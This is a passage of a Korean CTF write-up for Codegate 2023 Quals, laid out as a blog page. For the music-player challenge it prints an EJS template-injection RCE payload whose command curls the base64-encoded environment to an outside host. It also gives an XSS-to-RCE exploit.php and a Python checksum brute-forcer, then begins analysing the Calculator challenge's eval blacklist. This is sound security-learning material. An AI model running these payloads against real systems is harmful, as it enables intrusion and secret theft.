+<p>이를 도커 안애서 보내보면 RCE가 잘 트리거 되는 것을 볼 수 있다.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@2976ada99c43:~<span class="comment"># curl -X POST -H &quot;Cookie: SECRET=CHEESE_SECRET&quot; -H &quot;Content-Type: application/json&quot; -d &quot;&#123;</span></span><br><span class="line">&gt;     \&quot;<span class="built_in">id</span>\&quot;: &#123;</span><br><span class="line">&gt;         \&quot;settings\&quot;:&#123;</span><br><span class="line">&gt;             \&quot;view options\&quot;:&#123;</span><br><span class="line">&gt;                 \&quot;client\&quot;:<span class="literal">true</span>,</span><br><span class="line">&gt;                 \&quot;escapeFunction\&quot;:\&quot;1; <span class="built_in">return</span> global.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;curl http://ursobad.xyz/$(env|base64 -w0)&#x27;</span>)\&quot;</span><br><span class="line">&gt;             &#125;</span><br><span class="line">&gt;         &#125;,</span><br><span class="line">&gt;         \&quot;cache\&quot;:<span class="literal">false</span></span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; &#125;<span class="string">&quot; http://localhost:5000/api/messages</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github-production-user-asset-6210df.s3.amazonaws.com/66944342/247087195-0b87d325-f4e0-43fd-ba13-385e5a5e8aea.png" alt="image-1"></p>
+<p>이제 payload를 bot이 실행시키면 된다. 이는 <code>/api/stream/:url</code>과 <code>/api/inquiry</code>  endpoint로 해결할 수 있다. 먼저 <code>/api/inquiry</code>의 url 파라미터로 url을 붙여서 보내면 <code>redisQuery.rpush(&quot;query&quot;, req.query.url)</code>로 REDIS_URL_QUERY에 url이 저장되고 worker.py에서 bot이 url을 방문한다. 이때 <code>/api/stream/:url</code>은 <code>content-type</code> 이 [“audio&#x2F;mpeg”, “audio&#x2F;mp3”, “audio&#x2F;wav”, “audio&#x2F;ogg”] 중 하나일때 <em>response</em>.data를 그대로 리턴해주기 때문에 XSS를 발생 시킬 수 있다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xss_test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: audio/mp3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">print</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://localhost/api/stream/http%3A%2F%2Fv.ursobad.xyz%2Fb.php">http://localhost/api/stream/http%3A%2F%2Fv.ursobad.xyz%2Fb.php</a></p>
+<p><img src="https://github-production-user-asset-6210df.s3.amazonaws.com/66944342/247087002-0412e362-ad3d-4742-bb1e-8280483a93fa.png" alt="image-2"></p>
+<p>모든 취약점을 종합한 exploit code와 flag를 얻는 방법은 아래와 같다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exploit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: audio/mp3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;view options&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;client&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="string">&quot;escapeFunction&quot;</span>: <span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl http://ursobad.xyz/$(env|base64 -w0)&#x27;)&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;cache&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fetch</span>(<span class="string">&quot;/api/messages&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: JSON.<span class="title function_ invoke__">stringify</span>(data)</span><br><span class="line">    &#125;).<span class="title function_ invoke__">then</span>((res) =&gt; console.<span class="title function_ invoke__">log</span>(res))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>javascript를 이용해서 <code>http://nginx/api/messages</code>에 ejs payload로 요청을 보내는 코드(exploit.php)를 서버에 올린다.(evil_url)</li>
+<li><code>/api/inquiry</code> endpoint의 url인자를 <code>http://nginx/api/stream/evil_url</code>로 주고 요청을 보낸다.</li>
+<li>worker bot이 돌면서 <code>http://nginx/api/stream/evil_url</code>로 요청을 보내고 XSS가 트리거 된다.</li>
+<li>XSS는 &#x2F;api&#x2F;messages에 ejs injection을 통해 환경변수를 유출하고 flag를 얻을 수 있다.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ex.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLastCharacterMD5</span>(<span class="params">s, n</span>):</span><br><span class="line">    md5Hash = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    lastNCharacters = md5Hash[-n:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(lastNCharacters, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http%3A%2F%2Fnginx%2Fapi%2Fstream%2Fhttp%253A%252F%252Fv.ursobad.xyz%252Fexploit.php&#x27;</span> </span><br><span class="line">HOST = <span class="string">f&#x27;http://127.0.0.1/api/inquiry?url=<span class="subst">&#123;url&#125;</span>&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(HOST)</span><br><span class="line">sess= requests.session()</span><br><span class="line">res = sess.get(HOST).text</span><br><span class="line">length,pwl =  res.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(length, pwl)</span><br><span class="line">length = <span class="built_in">int</span>(length)</span><br><span class="line">pwl = <span class="built_in">int</span>(pwl, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">characters = <span class="string">&quot;abcdef0123456789&quot;</span></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(characters, length):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    cmp = getLastCharacterMD5(s, length)</span><br><span class="line">    <span class="keyword">if</span> cmp == pwl:</span><br><span class="line">        <span class="built_in">print</span>(cmp, pwl)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">res = sess.get(<span class="string">f&#x27;<span class="subst">&#123;HOST&#125;</span>&amp;checksum=<span class="subst">&#123;s&#125;</span>&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    platform: linux/x86_64</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;80:80&quot;</span></span><br><span class="line">    links:</span><br><span class="line">      - db</span><br><span class="line">      - bot</span><br><span class="line">    volumes:</span><br><span class="line">      - ./html:/var/www/html</span><br><span class="line">  bot:</span><br><span class="line">    build: ./bot</span><br><span class="line">    platform: linux/x86_64</span><br><span class="line">    volumes:</span><br><span class="line">      - ./bot:/usr/src/app</span><br><span class="line">    restart: always</span><br><span class="line">    environment: </span><br><span class="line">      - TZ=Asia/Seoul </span><br><span class="line">  db:</span><br><span class="line">    image: mysql:<span class="number">8.0</span></span><br><span class="line">    platform: linux/x86_64</span><br><span class="line">    command: --default-authentication-plugin=mysql_native_password</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: codegate</span><br><span class="line">      MYSQL_USER: codegate</span><br><span class="line">      MYSQL_PASSWORD: codegate111!</span><br><span class="line">      MYSQL_ROOT_PASSWORD: rootroot(_)!@</span><br><span class="line">    volumes:</span><br><span class="line">      - ./mysql-init-files:/docker-<span class="keyword">entrypoint</span><span class="language-bash">-initdb.d</span></span><br><span class="line">    networks:</span><br><span class="line">      - default</span><br></pre></td></tr></table></figure>
+
+<p>도커 파일을 보면 PHP로 도는 웹서버 하나와 디비, 그리고 bot이 보는것을 알 수 있다. bot의 존재로 아마 XSS를 통해서 뭘 할수 있을것으로 추측된다.</p>
+<p>bot코드를 보면 guest, guest로 로그인해서 쿠키에 flag를 세팅하고 user가 share한 링크에 들어가는 것을 알 수 있다.</p>
+<p>그리고 전체적인 php코드 중 아래와 같은 핵심 로직을 찾을 수 있다.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// /html/api/calculate.php</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onhashchange</span> = <span class="keyword">async</span> ()=&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> code = <span class="title function_">atob</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>));</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">isDebug</span> =  (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/debug.php&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="title class_">Number</span>(data.<span class="property">isDebug</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">isDebug</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> result = <span class="built_in">eval</span>(<span class="title function_">atob</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)));</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(&#123;<span class="attr">result</span>: result, <span class="attr">hacker</span>: <span class="number">0</span>&#125;,<span class="string">&quot;*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(code)) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> result = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(code);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(&#123;<span class="attr">result</span>: result, <span class="attr">hacker</span>: <span class="number">0</span>&#125;,<span class="string">&quot;*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(code);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(<span class="regexp">/!|@|#|\$|\^|&amp;|_|;|\&quot;|\&#x27;|\[|\]|\&#123;|\&#125;|[g-w]|[y-z]/</span>.<span class="title function_">test</span>(code))&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;Are you hacker??&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(&#123;<span class="attr">result</span>: <span class="literal">null</span>, <span class="attr">hacker</span>: <span class="number">1</span>&#125;,<span class="string">&quot;*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> result = <span class="built_in">eval</span>(<span class="title function_">atob</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)))</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(code, result);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(&#123;<span class="attr">result</span>: result, <span class="attr">hacker</span>: <span class="number">0</span>&#125;,<span class="string">&quot;*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>isDebug는 user가 admin일시에 1이 되는데 눈을 씻고 찾아봐도 sqli 백터가 없어서 이를 이용하는 것은 아니었다.</p>
+<p>만약 localStorage에 code가 설정되어 있지 않으면 else문으로 들어가 black list check를 한 후에 해당되는 문자가 있을시 result가 null로 넘어가고 아닐시에는 <code>eval(atob(location.hash.slice(1)))</code>를 result에 넘긴다.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#codegate-music-player"><span class="toc-number">1.</span> <span class="toc-text">codegate-music-player</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Calculator"><span class="toc-number">2.</span> <span class="toc-text">Calculator</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&text=Codegate 2023 QUALS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&is_video=false&description=Codegate 2023 QUALS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Codegate 2023 QUALS&body=Check out this article: https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&name=Codegate 2023 QUALS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&t=Codegate 2023 QUALS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    ursobad
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
